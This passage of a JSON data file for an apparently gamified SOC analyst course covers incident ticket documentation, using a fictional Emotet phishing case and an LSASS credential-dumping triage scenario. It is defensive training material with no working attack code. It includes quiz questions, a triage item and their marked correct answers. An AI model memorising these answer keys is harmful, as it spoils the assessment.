              "stage": "Pillar 2 & 3: Evidence & Timeline",
              "iconName": "server",
              "title": "Evidence Artifacts and UTC Timeline",
              "description": "Full SHA-256 hashes, C2 IP 198.51.100.42, and second-by-second UTC timeline from email receipt to containment.",
              "telemetrySnippet": "03:12:04 Email delivered | 03:14:22 User opened attachment | 03:15:01 EDR isolation applied",
              "highlightText": "Strict UTC timestamps establish the definitive sequence of events."
            },
            {
              "id": 4,
              "stage": "Pillar 4 & 5: Actions & Recommendations",
              "iconName": "siem",
              "title": "Actions Logged and Future Mitigations",
              "description": "Documents host containment, password reset, and recommendations to block macro execution across the finance organizational unit.",
              "telemetrySnippet": "RECOMMENDATION: Enforce GPO \"Block macros in Office files from the Internet\" across Finance OU.",
              "highlightText": "Recommendations transform an incident into long-term defensive hardening."
            }
          ]
        },
        "interactive": {
          "title": "Documentation Pillars Component Mapping",
          "scenario": "Review the four ticket sections below and map each to its corresponding documentation pillar.",
          "cards": [
            {
              "id": "ev-doc-find",
              "category": "User",
              "label": "Pillar: Findings (Summary)",
              "summary": "Confirmed Emotet banking trojan execution.",
              "detailedFindings": "Root cause: Socially engineered invoice attachment opened by payroll clerk. Blast radius limited to single host.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-doc-evid",
              "category": "Source IP",
              "label": "Pillar: Evidence (Artifacts)",
              "summary": "Hashes, C2 IP, and decoded command lines.",
              "detailedFindings": "SHA256: 4a2b91... | C2: 198.51.100.42:8443 | Payload: C:\\Users\\Public\\staged.exe.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-doc-time",
              "category": "Timeline",
              "label": "Pillar: Timeline (UTC)",
              "summary": "Second-by-second chronological sequence.",
              "detailedFindings": "03:12 UTC: Email arrived -> 03:14 UTC: Macro run -> 03:15 UTC: EDR alert -> 03:18 UTC: Host isolated.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-doc-rec",
              "category": "Event ID",
              "label": "Pillar: Recommendations",
              "summary": "Post-incident defense improvements.",
              "detailedFindings": "Deploy Microsoft Attack Surface Reduction (ASR) rule to block Office from creating child processes.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "Documentation for Incident Retrospectives and Audits",
          "scenario": "Six months after an incident, insurance auditors investigate a $1M cyber claim and request ticket records for proof of timely containment.",
          "analystMindset": "Write every ticket as if it will be read aloud in a courtroom by opposing counsel or examined by financial auditors.",
          "bestPractices": [
            "Standardize on ISO 8601 UTC timestamps (YYYY-MM-DDTHH:MM:SSZ).",
            "Always link related tickets (parent case, change requests, EDR alerts).",
            "Never edit or delete historical timestamps—append update notes sequentially."
          ]
        },
        "knowledgeCheck": {
          "dragDrop": {
            "title": "Arrange the 5 Core Documentation Pillars",
            "instructions": "Order the five essential sections of an audit-grade SOC incident report.",
            "items": [
              {
                "id": "dp-1",
                "label": "1. Executive Findings (What happened and root cause)",
                "order": 1
              },
              {
                "id": "dp-2",
                "label": "2. Forensic Evidence (Hashes, IPs, command lines, log snippets)",
                "order": 2
              },
              {
                "id": "dp-3",
                "label": "3. Chronological Timeline (UTC timestamps from access to containment)",
                "order": 3
              },
              {
                "id": "dp-4",
                "label": "4. Actions Taken (Containment, isolation, account resets)",
                "order": 4
              },
              {
                "id": "dp-5",
                "label": "5. Remediation Recommendations (GPO, firewall rules, user training)",
                "order": 5
              }
            ],
            "explanation": "Reports begin with executive findings, present evidence and timeline, record containment actions, and finish with prevention recommendations."
          }
        }
      },
      {
        "id": "topic-7-2",
        "unitId": "unit-7",
        "title": "Topic 2: [Lab] 🖥️ Create Incident Ticket",
        "order": 2,
        "estimatedMinutes": 25,
        "xpReward": 75,
        "theory": {
          "summaryLines": [
            "Creating an incident ticket is the culminating practical skill of a Tier 1 SOC Analyst.",
            "Every ticket must include standard fields: Incident Title, Severity Level, Affected Asset, User ID, Detection Source, and Status.",
            "The Investigation Narrative must clearly explain the attack chain from initial access through execution, persistence, and C2 communication.",
            "Containment Verification: Explicitly state the exact timestamp when network isolation was verified.",
            "Closing Codes: Ensure accurate resolution categorization (True Positive - Contained, False Positive - Tuned, Benign - Expected)."
          ],
          "knowMore": {
            "title": "NIST Computer Security Incident Handling: Section 3.4 Documentation",
            "description": "Review official guidelines on maintaining incident documentation logs and evidence checklists.",
            "externalUrl": "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
            "externalLabel": "NIST SP 800-61 Documentation"
          }
        },
        "demo": {
          "title": "[Demo] Constructing a Complete Incident Ticket",
          "subtitle": "Follow the step-by-step process of drafting an incident ticket in a modern enterprise ticketing platform",
          "steps": [
            {
              "id": 1,
              "stage": "Metadata Entry",
              "iconName": "analyst",
              "title": "Fill Mandatory Incident Header Fields",
              "description": "Title: [HIGH] Emotet Malware Execution on FIN-WS-09 | Severity: High | Asset: FIN-WS-09 | User: jdoe.",
              "telemetrySnippet": "HEADER: Category=\"Malware\" | Subcategory=\"Dropper\" | AssignmentGroup=\"Tier 2 IR\"",
              "highlightText": "Accurate headers ensure ticketing metrics and SLA dashboards calculate correctly."
            },
            {
              "id": 2,
              "stage": "Narrative Drafting",
              "iconName": "server",
              "title": "Draft Structured Attack Narrative",
              "description": "Document: User opened phishing attachment; Word spawned PowerShell; encoded script downloaded staged payload from external C2.",
              "telemetrySnippet": "NARRATIVE: \"At 03:14 UTC, user opened invoice.docm. WINWORD.EXE spawned powershell.exe with -enc...\"",
              "highlightText": "A structured narrative connects all technical evidence into a coherent story."
            },
            {
              "id": 3,
              "stage": "Artifact Attachment",
              "iconName": "siem",
              "title": "Attach IOC Table and Containment Proof",
              "description": "Paste table of SHA256 hashes, C2 IP address, and confirm host network isolation timestamp.",
              "telemetrySnippet": "CONTAINMENT: \"Host FIN-WS-09 isolated via CrowdStrike Falcon console at 03:18:04 UTC by Analyst J. Doe.\"",
              "highlightText": "Documenting containment timestamps proves SLA compliance."
            }
          ]
        },
        "interactive": {
          "title": "[Lab] 🖥️ Create Incident Ticket: Investigation Exhibit",
          "scenario": "Review the technical investigation exhibit below to verify all elements needed to complete your incident ticket.",
          "cards": [
            {
              "id": "ev-tick-hdr",
              "category": "User",
              "label": "Incident Header Information",
              "summary": "Title: [HIGH] Phishing Payload on FIN-WS-09.",
              "detailedFindings": "Reporter: SIEM Alert ALT-4401 | Asset: FIN-WS-09 (10.0.4.15) | User: jdoe (Finance) | Severity: High.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-tick-ioc",
              "category": "Source IP",
              "label": "IOC Table & Technical Evidence",
              "summary": "C2 IP: 198.51.100.42 | Hash: 4a2b91e...",
              "detailedFindings": "Process: powershell.exe | Parent: WINWORD.EXE | Dropped File: C:\\Users\\Public\\staged.exe.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-tick-act",
              "category": "Event ID",
              "label": "Containment Actions Executed",
              "summary": "Host isolated; active sessions killed.",
              "detailedFindings": "Isolated via EDR at 03:18:04 UTC. User password reset at 03:22:10 UTC. Firewall egress block applied at 03:25:00 UTC.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-tick-rec",
              "category": "Timeline",
              "label": "Remediation & Preventative Advice",
              "summary": "GPO hardening and macro restrictions.",
              "detailedFindings": "Block macros in downloaded documents across Finance department. Reimage workstation FIN-WS-09.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "The Post-Incident Review (Lessons Learned)",
          "scenario": "Following a major malware outbreak, the CISO hosts a Blameless Post-Mortem to determine how defenses failed.",
          "analystMindset": "A post-mortem does not assign blame to people; it identifies systemic gaps in technology and process so the enterprise improves.",
          "bestPractices": [
            "Participate actively in post-incident reviews with actionable feedback.",
            "Update relevant playbooks immediately if gaps were discovered during triage.",
            "Ensure all remediation tasks have assigned owners and completion target dates."
          ]
        },
        "knowledgeCheck": {
          "triageScenario": {
            "id": "ts-doc-lab",
            "alertName": "Alert ALT-702: Mimikatz LSASS Injection on Executive Host",
            "severity": "HIGH",
            "scenarioText": "Procdump executed against lsass.exe on CFO laptop. Host was isolated by analyst within 4 minutes, hashes documented, and ticket assigned to Tier 2.",
            "evidenceItems": [
              {
                "label": "Target Process",
                "value": "lsass.exe (Local Security Authority)",
                "insight": "Credential extraction target"
              },
              {
                "label": "Host Asset",
                "value": "EXEC-WS-01 (CFO Laptop)",
                "insight": "High-value executive asset"
              },
              {
                "label": "Action Taken",
                "value": "Host Isolated via EDR at 04:12 UTC",
                "insight": "SLA met within 15-minute window"
              }
            ],
            "correctVerdict": "TRUE_POSITIVE",
            "rationale": "Credential dumping against LSASS on an executive endpoint is a critical True Positive attack.",
            "analystAction": "Complete incident ticket with all 5 documentation pillars, attach memory triage package, and initiate executive credential reset."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-7-assessment",
      "title": "Topic 7 Assessment: SOC Documentation Standards",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u7-q1",
          "question": "What are the five core pillars of an audit-grade SOC incident report?",
          "options": [
            "Intro, Body, Conclusion, Footnotes, Appendix",
            "Findings, Evidence, Timeline, Actions, Recommendations",
            "User, Password, IP, Port, Protocol",
            "Detection, Prevention, Destruction, Recovery, Payment"
          ],
          "correctAnswer": 1,
          "explanation": "The five pillars are Findings (Summary), Evidence (Technical IOCs), Timeline (Chronology), Actions (Containment), and Recommendations (Future hardening)."
        },
        {
          "id": "u7-q2",
          "question": "Why must timestamps in security documentation always be recorded in UTC (Coordinated Universal Time)?",
          "options": [
            "UTC looks more professional on paper",
            "Enterprises have assets spread across multiple global timezones; standardizing on UTC prevents chronological ambiguity during cross-system correlation",
            "Computers can only understand UTC time",
            "Local daylight savings time is illegal in cybersecurity"
          ],
          "correctAnswer": 1,
          "explanation": "Standardizing on UTC eliminates confusion across distributed systems, multi-national assets, and daylight savings transitions."
        },
        {
          "id": "u7-q3",
          "question": "What is the primary objective of the \"Recommendations\" section in an incident ticket?",
          "options": [
            "To criticize the user who made a mistake",
            "To propose strategic preventative technical and policy controls that stop similar attacks from recurring",
            "To request a salary increase for the analyst",
            "To recommend purchasing more computer monitors"
          ],
          "correctAnswer": 1,
          "explanation": "Recommendations turn incident lessons into permanent defensive hardening (e.g. GPO restrictions, MFA enforcement, firewall rules)."
        },
        {
          "id": "u7-q4",
          "question": "If an analyst isolates an infected host but fails to document the action in the incident ticket, what is the consequence during an audit?",
          "options": [
            "Nothing, verbal confirmation is always sufficient",
            "The action is considered unverified or unperformed, potentially causing regulatory compliance failure or legal liability",
            "The ticketing system automatically deletes the case",
            "The host reconnects itself automatically"
          ],
          "correctAnswer": 1,
          "explanation": "In security operations and compliance audits: \"If it was not documented in the ticket, it never happened.\""
        }
      ]
    }
  }
];
